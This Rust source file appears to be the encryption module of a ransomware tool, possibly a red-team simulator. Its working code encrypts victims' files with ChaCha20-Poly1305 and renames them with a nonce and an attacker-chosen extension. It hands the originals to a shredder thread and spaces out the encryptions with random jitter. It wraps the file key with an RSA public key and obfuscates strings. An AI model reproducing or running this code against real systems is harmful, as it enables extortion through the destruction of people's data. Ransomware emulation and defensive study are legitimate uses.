use crossbeam_channel::{Receiver, Sender};
use hex::{decode, encode, FromHex};
use log::{debug, error, info, warn};
use purecrypto::cipher::{ChaCha20, ChaCha20Poly1305};
use purecrypto::rsa::BoxedRsaPublicKey;
use rand::{
    rngs::{SmallRng, StdRng},
    RngExt, SeedableRng,
};
use std::{
    fs::{self, File, OpenOptions},
    io::{Error, Read, Write},
    path::PathBuf,
    sync::{
        atomic::{AtomicU64, Ordering},
        Arc, LazyLock,
    },
    thread, time,
};

pub fn nonce_from_counter(counter: u64) -> [u8; 12] {
    let mut nonce = [0u8; 12];
    nonce[0..8].copy_from_slice(&counter.to_le_bytes());
    nonce
}

const BUFFER_LEN: usize = 100 * 1024;
const MAX_DECRYPT_CHUNK_LEN: usize = 1024 * 1024;
static ANALYSIS_FILENAME: LazyLock<String> = LazyLock::new(|| lc!("analysis.txt"));

pub fn encrypt(
    r: Receiver<Arc<PathBuf>>,
    s: Sender<Arc<PathBuf>>,
    key: Arc<[u8; 32]>,
    counter: Arc<AtomicU64>,
    encrypted_extension: Arc<String>,
    wait_time: Arc<u32>,
    jitter_time: Arc<u32>,
) -> thread::JoinHandle<()> {
    debug!("Starting encryption crypto thread");
    thread::spawn(move || loop {
        let file_path = match r.recv() {
            Ok(path) => {
                debug!("Received file path over channel: {path:?}");
                path
            }
            Err(error) => {
                warn!("Error receiving file path over channel: {error}");
                return;
            }
        };

        let result = std::panic::catch_unwind({
            let file_path = file_path.clone();
            let key = Arc::clone(&key);
            let counter = Arc::clone(&counter);
            let encrypted_extension = Arc::clone(&encrypted_extension);
            let s = s.clone();
            let wait_time = Arc::clone(&wait_time);
            let jitter_time = Arc::clone(&jitter_time);
            let mut rng_cheap = SmallRng::from_rng(&mut rand::rng());
            debug!("Created cheap random number generator");
            move || {
                info!("Encrypting file: {file_path:?}");

                let nonce = counter.fetch_add(1, Ordering::Relaxed);
                debug!("Nonce value after increment: {nonce:?}");

                let full_nonce_bytes = nonce_from_counter(nonce);
                debug!("Nonce value after padding: {full_nonce_bytes:?}");

                let nonce_file_extension =
                    format!("{}.{}", encode(full_nonce_bytes), encrypted_extension);
                debug!("Nonce extension: {nonce_file_extension}");

                let encrypted_file_path = {
                    let mut p = file_path.as_ref().clone();
                    let name = p
                        .file_name()
                        .map(|n| n.to_string_lossy().into_owned())
                        .unwrap_or_default();
                    p.set_file_name(format!("{name}.{nonce_file_extension}"));
                    p
                };
                debug!("Encrypted file path: {}", encrypted_file_path.display());

                debug!(
                    "Applying chacha20 with source {}, destination {}, and nonce {:?} ",
                    file_path.as_ref().display(),
                    encrypted_file_path.display(),
                    full_nonce_bytes
                );
                match aead_encrypt_file(
                    file_path.as_ref(),
                    &encrypted_file_path,
                    &key,
                    &full_nonce_bytes,
                ) {
                    Ok(()) => {
                        debug!("Successfully applied ChaCha to data for encryption: {file_path:?}");
                        if let Err(error) = s.send(file_path.clone()) {
                            error!("Failed to send path to shredder thread: {error}");
                        }
                    }
                    Err(error) => {
                        error!("Failed to apply ChaCha to data for encryption: {error:?}");
                    }
                }

                if *wait_time > 0 {
                    let time = *wait_time - *jitter_time + rng_cheap.random_range(0..*jitter_time);
                    debug!("Sleeping {time} seconds before next encryption");
                    let time_duration = time::Duration::from_secs(u64::from(time));
                    thread::sleep(time_duration);
                    debug!("Sleeping complete");
                }
            }
        });

        if result.is_err() {
            error!("Encryption thread recovered from panic on file: {file_path:?}");
        }
    })
}

pub fn record(r: Receiver<Arc<PathBuf>>, path: Arc<PathBuf>) -> thread::JoinHandle<()> {
    thread::spawn(move || {
        let analysis_file_path = path.join(&*ANALYSIS_FILENAME);
        let mut analysis_file = OpenOptions::new()
            .append(true)
            .create(true)
            .open(&analysis_file_path)
            .expect("Cannot open file");

        loop {
            let file_path = match r.recv() {
                Ok(path) => {
                    debug!("Received file path over channel: {path:?}");
                    path
                }
                Err(error) => {
                    warn!("Error receiving file path over channel: {error}");
                    return;
                }
            };

            analysis_file
                .write_all(format!("{}\n", file_path.to_string_lossy()).as_bytes())
                .expect("Failed to write to file");
        }
    })
}

pub fn decrypt(r: Receiver<Arc<PathBuf>>, key: Arc<[u8; 32]>) -> thread::JoinHandle<()> {
    thread::spawn(move || loop {
        let file_path = match r.recv() {
            Ok(path) => {
                debug!("Received file path over channel: {path:?}");
                path
            }
            Err(error) => {
                warn!("Error receiving file path over channel: {error}");
                return;
            }
        };

        info!("Decrypting file: {}", file_path.display());

        let file_name_osstr = if let Some(os_str) = file_path.file_name() {
            debug!("Successfully got file name from path: {}", os_str.display());
            os_str
        } else {
            error!("File path has invalid file name: {file_path:?}");
            continue;
        };

        let file_name = if let Some(name) = file_name_osstr.to_str() {
            debug!("Successfully converted file name to string: {name}");
            name
        } else {
            error!(
                "File name is not valid UTF-8: {}",
                file_name_osstr.display()
            );
            continue;
        };

        let file_extensions: Vec<&str> = file_name.split('.').collect();
        let file_extensions_count = file_extensions.len();
        if file_extensions_count < 2 {
            error!("File lacks the number of extensions to decrypt: {file_extensions_count}");
            continue;
        }

        let nonce_str = if let Some(segment) = file_extensions.get(file_extensions_count - 2) {
            debug!("Successfully got nonce file extension: {segment}");
            segment
        } else {
            error!("Cannot get nonce extension: {file_extensions:?}");
            continue;
        };

        let full_nonce_bytes = match <[u8; 12]>::from_hex(nonce_str) {
            Ok(nonce_bytes) => {
                debug!("Extension hex decoded: {nonce_bytes:?}");
                nonce_bytes
            }
            Err(error) => {
                error!("Extension hex could not be decoded: {error:?}");
                continue;
            }
        };

        let parent_dir = if let Some(parent) = file_path.parent() {
            debug!("Successfully got parent path of file path: {file_path:?}");
            parent
        } else {
            error!("File path has invalid parent path: {file_path:?}");
            continue;
        };

        let decrypted_file_name = file_extensions[..file_extensions_count - 2].join(".");
        debug!("Decrypted file name: {decrypted_file_name}");
        let decrypted_file_path = parent_dir.join(decrypted_file_name);
        debug!("Decrypted file path: {}", decrypted_file_path.display());

        match aead_decrypt_file(
            file_path.as_ref(),
            &decrypted_file_path,
            &key,
            &full_nonce_bytes,
        ) {
            Ok(()) => {
                debug!("Successfully applied ChaCha to data for decryption: {file_path:?}");
            }
            Err(error) => {
                error!("Failed to apply ChaCha to data for decryption: {error:?}");
            }
        }
    })
}

fn chunk_nonce(base: &[u8; 12], chunk_index: u32) -> [u8; 12] {
    let mut nonce = *base;
    nonce[8..12].copy_from_slice(&chunk_index.to_le_bytes());
    nonce
}

fn aead_encrypt_file(
    source_file_path: &PathBuf,
    destination_file_path: &PathBuf,
    key: &[u8; 32],
    full_nonce_bytes: &[u8; 12],
) -> Result<(), Error> {
    let result = (|| -> Result<(), Error> {
        let aead = ChaCha20Poly1305::new(key);
        let mut source = File::open(source_file_path)?;
        let mut dest = File::create(destination_file_path)?;
        let mut buffer = vec![0u8; BUFFER_LEN];
        let mut chunk_index: u32 = 0;
        loop {
            let read = match source.read(&mut buffer) {
                Ok(0) => break,
                Ok(n) => n,
                Err(error) => return Err(error),
            };
            let aad = chunk_index.to_le_bytes();
            let nonce = chunk_nonce(full_nonce_bytes, chunk_index);
            let tag = aead.encrypt(&nonce, &aad[..], &mut buffer[..read]);
            dest.write_all(&u32::try_from(read).map_err(Error::other)?.to_le_bytes())?;
            dest.write_all(&buffer[..read])?;
            dest.write_all(&tag)?;
            chunk_index = chunk_index
                .checked_add(1)
                .ok_or_else(|| Error::other("chunk index overflow during encryption"))?;
        }
        dest.sync_all()?;
        Ok(())
    })();
    if result.is_err() {
        let _ = fs::remove_file(destination_file_path);
    }
    result
}

fn aead_decrypt_file(
    source_file_path: &PathBuf,
    destination_file_path: &PathBuf,
    key: &[u8; 32],
    full_nonce_bytes: &[u8; 12],
) -> Result<(), Error> {
    let aead = ChaCha20Poly1305::new(key);
    let mut source = File::open(source_file_path)?;
    let mut dest = File::create(destination_file_path)?;
    let mut chunk_index: u32 = 0;
    loop {
        let mut len_buf = [0u8; 4];
        match source.read(&mut len_buf[..1]) {
            Ok(0) => break,
            Ok(_) => {}
            Err(error) => return Err(error),
        }
        source.read_exact(&mut len_buf[1..])?;
        let cipher_len = u32::from_le_bytes(len_buf) as usize;
        if cipher_len > MAX_DECRYPT_CHUNK_LEN {
            return Err(Error::other("encrypted chunk length implausible"));
        }
        let mut ciphertext = vec![
            0u8;
            cipher_len.checked_add(16).ok_or_else(|| {
                Error::other("encrypted chunk length overflow")
            })?
        ];
        source.read_exact(&mut ciphertext)?;
        let mut tag = [0u8; 16];
        tag.copy_from_slice(&ciphertext[cipher_len..]);
        let aad = chunk_index.to_le_bytes();
        let nonce = chunk_nonce(full_nonce_bytes, chunk_index);
        aead.decrypt(&nonce, &aad[..], &mut ciphertext[..cipher_len], &tag)
            .map_err(|_| Error::other("ChaCha20-Poly1305 authentication failed"))?;
        dest.write_all(&ciphertext[..cipher_len])?;
        chunk_index = chunk_index
            .checked_add(1)
            .ok_or_else(|| Error::other("chunk index overflow during decryption"))?;
    }
    dest.sync_all()?;
    Ok(())
}

pub fn encrypt_string(source: &str, key: &[u8; 32], full_nonce_bytes: &[u8; 12]) -> String {
    debug!("Encrypting string: {source}");
    let mut source_data = source.as_bytes().to_vec();
    debug!("String bytes: {source_data:?}");
    ChaCha20::new(key).apply_keystream(full_nonce_bytes, 0, &mut source_data);
    debug!("String encrypted: {:?}", encode(&source_data));
    encode(source_data)
}

pub fn decrypt_string(source_str: &str, key: &[u8; 32], nonce_str: &str) -> Option<String> {
    let mut source_data = match decode(source_str) {
        Ok(bytes) => {
            debug!("Successfully decoded hex encrypted string: {bytes:?}");
            bytes
        }
        Err(error) => {
            error!("Unable to decode hex encrypted string: {error}");
            return None;
        }
    };
    let full_nonce_bytes = match <[u8; 12]>::from_hex(nonce_str) {
        Ok(nonce_bytes) => {
            debug!("Successfully decoded hex nonce: {nonce_bytes:?}");
            nonce_bytes
        }
        Err(error) => {
            error!("Unable to decode hex nonce: {error}");
            return None;
        }
    };

    debug!("Decrypting to string: {source_data:?}");
    ChaCha20::new(key).apply_keystream(&full_nonce_bytes, 0, &mut source_data);
    debug!("String bytes: {source_data:?}");
    match String::from_utf8(source_data) {
        Ok(string) => {
            debug!("Successfully decoded bytes to string: {string}");
            Some(string)
        }
        Err(error) => {
            error!("Failed to decode bytes to string: {error}");
            None
        }
    }
}

pub fn generate_sym_key(sym_key: &mut [u8; 32]) {
    debug!("Starting key generation");
    let mut rng = StdRng::from_rng(&mut rand::rng());
    rng.fill(sym_key);
    debug!("Generated symmetric key");
}

pub fn encrypt_sym_key(asym_pub_key: &BoxedRsaPublicKey, sym_key: &[u8; 32]) -> String {
    use purecrypto::rng::OsRng;
    let mut rng = OsRng;
    encode(
        asym_pub_key
            .encrypt_pkcs1v15(sym_key, &mut rng)
            .expect("Failed to encrypt symmetric key"),
    )
}
